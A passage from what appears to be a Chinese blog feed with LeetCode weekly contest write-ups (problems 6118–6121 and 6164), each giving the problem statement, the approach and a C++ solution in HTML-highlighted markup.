class="keyword">for</span> (<span class="keyword">auto</span> v : passengers) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> m = buses.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = passengers.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="type">int</span> tot = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; n &amp;&amp; tot &lt; capacity &amp;&amp; passengers[j] &lt;= buses[i]) &#123;</span><br><span class="line">                tot++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (tot &lt; capacity) &#123;</span><br><span class="line">                res = buses[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res = passengers[j - <span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (cnt.<span class="built_in">count</span>(res)) &#123;</span><br><span class="line">            res--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6118-最小差值平方和"><a href="#6118-最小差值平方和" class="headerlink" title="6118. 最小差值平方和"></a>6118. 最小差值平方和</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <code>0</code> 开始的整数数组 <code>nums1</code> 和 <code>nums2</code> ，长度为 <code>n</code> 。</p>
<p>数组 <code>nums1</code> 和 <code>nums2</code> 的 差值平方和 定义为所有满足 <code>0 &lt;= i &lt; n</code> 的 <code>(nums1[i] - nums2[i])2</code> 之和。</p>
<p>同时给你两个正整数 <code>k1</code> 和 <code>k2</code> 。你可以将 <code>nums1</code> 中的任意元素 <code>+1</code> 或者 <code>-1</code> 至多 <code>k1</code> 次。类似的，你可以将 <code>nums2</code> 中的任意元素 <code>+1</code> 或者 <code>-1</code> 至多 <code>k2</code> 次。</p>
<p>请你返回修改数组 <code>nums1</code> 至多 <code>k1</code> 次且修改数组 <code>nums2</code> 至多 <code>k2</code> 次后的最小 差值平方和 。</p>
<p>注意：你可以将数组中的元素变成 负 整数。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,3,4], nums2 = [2,10,20,19], k1 = 0, k2 = 0</span><br><span class="line">输出：579</span><br><span class="line">解释：nums1 和 nums2 中的元素不能修改，因为 k1 = 0 和 k2 = 0 。</span><br><span class="line">差值平方和为：(1 - 2)2 + (2 - 10)2 + (3 - 20)2 + (4 - 19)2 = 579 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,4,10,12], nums2 = [5,8,6,9], k1 = 1, k2 = 1</span><br><span class="line">输出：43</span><br><span class="line">解释：一种得到最小差值平方和的方式为：</span><br><span class="line">- 将 nums1[0] 增加一次。</span><br><span class="line">- 将 nums2[2] 增加一次。</span><br><span class="line">最小差值平方和为：</span><br><span class="line">(2 - 5)2 + (4 - 8)2 + (10 - 7)2 + (12 - 9)2 = 43 。</span><br><span class="line">注意，也有其他方式可以得到最小差值平方和，但没有得到比 43 更小答案的方案。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums1.length == nums2.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= nums1[i], nums2[i] &lt;= 105</code></li>
<li><code>0 &lt;= k1, k2 &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-sum-of-squared-difference">https://leetcode.cn/problems/minimum-sum-of-squared-difference</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学+ 贪心算法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目本质为贪心算法，首先我们求出两个数组中每个索引上两个元素的差值绝对值为 $diff[i]$。对于 $k1,k2$ 不管用加还是减，我们都可以使得绝对值 $diff[i]$ 变小，假设目前还剩下 $1$ 个可以改变，对于 $x,y$, 此时如果满足 $x &gt; y$, 此时我们应该将 $x$ 进行减 $1$, 因为我们可以知道如下不等式，$(x-1)^2 + y^2 &lt; x ^ 2 + (y-1)^2$，因此我们应当的将 $diff$ 数组的元素最大值尽可能的小，此时我们将 $diff$ 中的最大值依次减小到跟第二大的值相等，按照上述步骤进行递减，直到 $k1 + k2$ 减到 $0$ 为止。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$, $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示给定数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minSumSquareDiff</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> k1, <span class="type">int</span> k2)</span> </span>&#123;</span><br><span class="line">        map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cnt[<span class="built_in">abs</span>(nums1[i] - nums2[i])]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> tot = k1 + k2;</span><br><span class="line">        <span class="keyword">while</span> (tot &gt; <span class="number">0</span> &amp;&amp; cnt.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [curr, freq1] = *cnt.<span class="built_in">rbegin</span>();</span><br><span class="line">            cnt.<span class="built_in">erase</span>(curr);</span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">auto</span> [prev, freq2] = *cnt.<span class="built_in">rbegin</span>();</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> need = (<span class="type">long</span> <span class="type">long</span>)freq1 * (curr - prev);</span><br><span class="line">                <span class="keyword">if</span> (need &lt;= tot) &#123;</span><br><span class="line">                    cnt[prev] += freq1;</span><br><span class="line">                    tot -= need;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">int</span> x = tot / freq1;</span><br><span class="line">                    <span class="type">int</span> y = tot % freq1;</span><br><span class="line">                    cnt[curr - x - <span class="number">1</span>] += y;</span><br><span class="line">                    cnt[curr - x] += freq1 - y;</span><br><span class="line">                    tot = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [curr, freq] : cnt) &#123;</span><br><span class="line">            ans += (<span class="type">long</span> <span class="type">long</span>)curr * curr * freq;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6119-元素值大于变化阈值的子数组"><a href="#6119-元素值大于变化阈值的子数组" class="headerlink" title="6119. 元素值大于变化阈值的子数组"></a>6119. 元素值大于变化阈值的子数组</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>threshold</code> 。</p>
<p>找到长度为 <code>k</code> 的 <code>nums</code> 子数组，满足数组中 每个 元素都 大于 <code>threshold / k </code>。</p>
<p>请你返回满足要求的 任意 子数组的 大小 。如果没有这样的子数组，返回 <code>-1</code> 。</p>
<p>子数组 是数组中一段连续非空的元素序列。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,4,3,1], threshold = 6</span><br><span class="line">输出：3</span><br><span class="line">解释：子数组 [3,4,3] 大小为 3 ，每个元素都大于 6 / 3 = 2 。</span><br><span class="line">注意这是唯一合法的子数组。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [6,5,6,5,8], threshold = 7</span><br><span class="line">输出：1</span><br><span class="line">解释：子数组 [8] 大小为 1 ，且 8 &gt; 7 / 1 = 7 。所以返回 1 。</span><br><span class="line">注意子数组 [6,5] 大小为 2 ，每个元素都大于 7 / 2 = 3.5 。</span><br><span class="line">类似的，子数组 [6,5,6] ，[6,5,6,5] ，[6,5,6,5,8] 都是符合条件的子数组。</span><br><span class="line">所以返回 2, 3, 4 和 5 都可以。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], threshold &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/subarray-with-elements-greater-than-varying-threshold">https://leetcode.cn/problems/subarray-with-elements-greater-than-varying-threshold</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>单调栈
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们直接求出结果的话比较难求出来，我们依次遍历第 $i$ 个元素，并找到以 $nums[i]$ 为最小的元素的最大长度，我们可以分开计算计算，计算 $i$ 的左边连续有多少个元素比 $nums[i]$ 小，记为 $left[i]$,计算 $i$ 的右边连续有多少个元素比 $nums[i]$ 小，记为 $right[i]$，此时我们知道以 $num[i]$ 为最小的连续子数组的长度为 $left[i] + right[i] + 1$，如果满足 $(left[i] + right[i] + 1) \times nums[i] &gt; threshold$ 时，则就满足题目要求。</li>
<li>我们可以利用单调栈分别求出左右两边第一个小于 $nums[i]$ 的元素的索引 $j$。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$n$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$n$，$n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">validSubarraySize</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> threshold)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        stack&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt; st1, st2;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">left</span><span class="params">(n)</span>, <span class="title">right</span><span class="params">(n)</span></span>;</span><br><span class="line">        st1.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!st1.<span class="built_in">empty</span>() &amp;&amp; nums[i] &lt;= st1.<span class="built_in">top</span>().first) &#123;</span><br><span class="line">                st1.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            left[i] = i - st1.<span class="built_in">top</span>().second - <span class="number">1</span>;</span><br><span class="line">            st1.<span class="built_in">emplace</span>(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!st2.<span class="built_in">empty</span>() &amp;&amp; nums[i] &lt;= st2.<span class="built_in">top</span>().first) &#123;</span><br><span class="line">                st2.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (st2.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                right[i] = n - i - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right[i] = st2.<span class="built_in">top</span>().second - i - <span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            st2.<span class="built_in">emplace</span>(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> x = (<span class="type">long</span> <span class="type">long</span>)(left[i] + right[i] + <span class="number">1</span>) * nums[i];</span><br><span class="line">            <span class="keyword">if</span> ( x &gt; threshold) &#123;</span><br><span class="line">                <span class="keyword">return</span> left[i] + right[i] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode conttest 302</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/17/</url>
    <content><![CDATA[<h2 id="leetcode-conttest-302"><a href="#leetcode-conttest-302" class="headerlink" title="leetcode conttest 302"></a>leetcode conttest 302</h2><p>确实最简单的周赛，4个题目都可以暴力。</p>
<h3 id="6120-数组能形成多少数对"><a href="#6120-数组能形成多少数对" class="headerlink" title="6120. 数组能形成多少数对"></a>6120. 数组能形成多少数对</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的整数数组 <code>nums</code> 。在一步操作中，你可以执行以下步骤：</p>
<ul>
<li>从 <code>nums</code> 选出 两个 相等的 整数</li>
<li>从 <code>nums </code>中移除这两个整数，形成一个 数对<br>请你在 <code>nums</code> 上多次执行此操作直到无法继续执行。</li>
</ul>
<p>返回一个下标从 <code>0</code> 开始、长度为 <code>2</code> 的整数数组 <code>answer</code> 作为答案，其中 <code>answer[0]</code> 是形成的数对数目，<code>answer[1]</code> 是对 <code>nums</code> 尽可能执行上述操作后剩下的整数数目。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,2,1,3,2,2]</span><br><span class="line">输出：[3,1]</span><br><span class="line">解释：</span><br><span class="line">nums[0] 和 nums[3] 形成一个数对，并从 nums 中移除，nums = [3,2,3,2,2] 。</span><br><span class="line">nums[0] 和 nums[2] 形成一个数对，并从 nums 中移除，nums = [2,2,2] 。</span><br><span class="line">nums[0] 和 nums[1] 形成一个数对，并从 nums 中移除，nums = [2] 。</span><br><span class="line">无法形成更多数对。总共形成 3 个数对，nums 中剩下 1 个数字。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1]</span><br><span class="line">输出：[1,0]</span><br><span class="line">解释：nums[0] 和 nums[1] 形成一个数对，并从 nums 中移除，nums = [] 。</span><br><span class="line">无法形成更多数对。总共形成 1 个数对，nums 中剩下 0 个数字。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0]</span><br><span class="line">输出：[0,1]</span><br><span class="line">解释：无法形成数对，nums 中剩下 1 个数字。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-number-of-pairs-in-array/">https://leetcode.cn/problems/maximum-number-of-pairs-in-array/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>哈希统计
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，直接统计数目中出现重复元素的个数即可, 统计所有可能的偶数对。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">numberOfPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> x = *<span class="built_in">max_element</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">cnt</span><span class="params">(x + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : nums) &#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= x; i++) &#123;</span><br><span class="line">            ans[<span class="number">0</span>] += cnt[i] / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans[<span class="number">1</span>] = nums.<span class="built_in">size</span>() - ans[<span class="number">0</span>] * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6164-数位和相等数对的最大和"><a href="#6164-数位和相等数对的最大和" class="headerlink" title="6164. 数位和相等数对的最大和"></a>6164. 数位和相等数对的最大和</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的数组<code>nums</code>，数组中的元素都是 正 整数。请你选出两个下标 <code>i</code> 和 <code>j（i != j）</code>，且 <code>nums[i]</code> 的数位和 与  <code>nums[j]</code> 的数位和相等。</p>
<p>请你找出所有满足条件的下标 <code>i</code> 和 <code>j</code> ，找出并返回 <code>nums[i] + nums[j]</code> 可以得到的 最大值 。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [18,43,36,13,7]</span><br><span class="line">输出：54</span><br><span class="line">解释：满足条件的数对 (i, j) 为：</span><br><span class="line">- (0, 2) ，两个数字的数位和都是 9 ，相加得到 18 + 36 = 54 。</span><br><span class="line">- (1, 4) ，两个数字的数位和都是 7 ，相加得到 43 + 7 = 50 。</span><br><span class="line">所以可以获得的最大和是 54 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [10,12,19,14]</span><br><span class="line">输出：-1</span><br><span class="line">解释：不存在满足条件的数对，返回 -1 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/max-sum-of-a-pair-with-equal-sum-of-digits">https://leetcode.cn/problems/max-sum-of-a-pair-with-equal-sum-of-digits</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设 $dp[x]$ 表示数位和为 $x$ 值最大的数，我们依次遍历每个数 $x$，并计算 $x$ 的数位和为 $sum[x]$，此时我们计算 $sum[x]$，对于 $x$ 则以 $x$ 为其中一个数的最大的和为 $x + dp[sum[x]]$，同时我们更新 $dp[x] &#x3D; \max(dp[x],x)$。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> x : nums) &#123;</span><br><span class="line">            <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> val = x;</span><br><span class="line">            <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">                sum += (x % <span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">count</span>(sum)) &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, val + cnt[sum]); </span><br><span class="line">                cnt[sum] = <span class="built_in">max</span>(cnt[sum], val);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cnt[sum] = val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6121-裁剪数字后查询第-K-小的数字"><a href="#6121-裁剪数字后查询第-K-小的数字" class="headerlink" title="6121. 裁剪数字后查询第 K 小的数字"></a>6121. 裁剪数字后查询第 K 小的数字</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0 </code>开始的字符串数组 <code>nums</code> ，其中每个字符串 长度相等 且只包含数字。</p>
<p>再给你一个下标从 <code>0</code> 开始的二维整数数组 <code>queries</code> ，其中 <code>queries[i] = [ki, trimi]</code> 。对于每个 <code>queries[i]</code> ，你需要：</p>
<p>将 <code>nums</code> 中每个数字 裁剪 到剩下 最右边 <code>trimi</code> 个数位。<br>在裁剪过后的数字中，找到 <code>nums</code> 中第 <code>ki</code> 小数字对应的 下标 。如果两个裁剪后数字一样大，那么下标 更小 的数字视为更小的数字。<br>将 <code>nums</code> 中每个数字恢复到原本字符串。<br>请你返回一个长度与 <code>queries</code> 相等的数组 <code>answer</code>，其中 <code>answer[i]</code> 是第 <code>i</code> 次查询的结果。</p>
<p>提示：</p>
<ul>
<li>裁剪到剩下 <code>x</code> 个数位的意思是不断删除最左边的数位，直到剩下 <code>x</code> 个数位。</li>
<li><code>nums</code> 中的字符串可能会有前导 <code>0</code> 。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [&quot;102&quot;,&quot;473&quot;,&quot;251&quot;,&quot;814&quot;], queries = [[1,1],[2,3],[4,2],[1,2]]</span><br><span class="line">输出：[2,2,1,0]</span><br><span class="line">解释：</span><br><span class="line">1. 裁剪到只剩 1 个数位后，nums = [&quot;2&quot;,&quot;3&quot;,&quot;1&quot;,&quot;4&quot;] 。最小的数字是 1 ，下标为 2 。</span><br><span class="line">2. 裁剪到剩 3 个数位后，nums 没有变化。第 2 小的数字是 251 ，下标为 2 。</span><br><span class="line">3. 裁剪到剩 2 个数位后，nums = [&quot;02&quot;,&quot;73&quot;,&quot;51&quot;,&quot;14&quot;] 。第 4 小的数字是 73 ，下标为 1 。</span><br><span class="line">4. 裁剪到剩 2 个数位后，最小数字是 2 ，下标为 0 。</span><br><span class="line">   注意，裁剪后数字 &quot;02&quot; 值为 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [&quot;24&quot;,&quot;37&quot;,&quot;96&quot;,&quot;04&quot;], queries = [[2,1],[2,2]]</span><br><span class="line">输出：[3,0]</span><br><span class="line">解释：</span><br><span class="line">1. 裁剪到剩 1 个数位，nums = [&quot;4&quot;,&quot;7&quot;,&quot;6&quot;,&quot;4&quot;] 。第 2 小的数字是 4 ，下标为 3 。</span><br><span class="line">   有两个 4 ，下标为 0 的 4 视为小于下标为 3 的 4 。</span><br><span class="line">2. 裁剪到剩 2 个数位，nums 不变。第二小的数字是 24 ，下标为 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>1 &lt;= nums[i].length &lt;= 100</code></li>
<li><code>nums[i]</code> 只包含数字。</li>
<li>所有 <code>nums[i].length</code> 的长度 相同 。</li>
<li><code>1 &lt;= queries.length &lt;= 100</code></li>
<li><code>queries[i].length == 2</code></li>
<li><code>1 &lt;= ki &lt;= nums.length</code></li>
<li><code>1 &lt;= trimi &lt;= nums[0].length</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/query-kth-smallest-trimmed-number">https://leetcode.cn/problems/query-kth-smallest-trimmed-number</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>暴力排序
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目给的数量级较小，实际我们直接模拟排序即可，按照题目要求，每次查询时，将要求长度的后缀按照字典序进行排序即可，非常简单；</li>
<li>感觉数量级还可以再高一点, 此时可以用基数排序进行优化。基数排序对后缀进行排序，时间复杂度为 $O(mn|S|)$，$n$ 表示查询的次数，$m$ 表示字符串数组的长度 $|S|$ 表示字符集。当然更优化的算法可以采用后缀数组排序。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：暴力模拟的时间复杂度为 $O(qnm\log m)$, $q$ 表示给定的字符串的长度, $n$ 表示查询的次数，$m$ 表示字符串数组的长度。</li>
<li>空间复杂度：$O(qm)$，$q$ 表示给定的字符串的长度, $m$ 表示字符串数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><ol>
<li>直接排序<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">smallestTrimmedNumbers</span><span class="params">(vector&lt;string&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len = nums[<span class="number">0</span>].<span class="built_in">size</span>();        </span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> k = queries[i][<span class="number">0</span>], trim = queries[i][<span class="number">1</span>];</span><br><span class="line">            vector&lt;pair&lt;string, <span class="type">int</span>&gt;&gt; suffix;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                suffix.<span class="built_in">emplace_back</span>(nums[j].<span class="built_in">substr</span>(len - trim), j);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">sort</span>(suffix.<span class="built_in">begin</span>(), suffix.<span 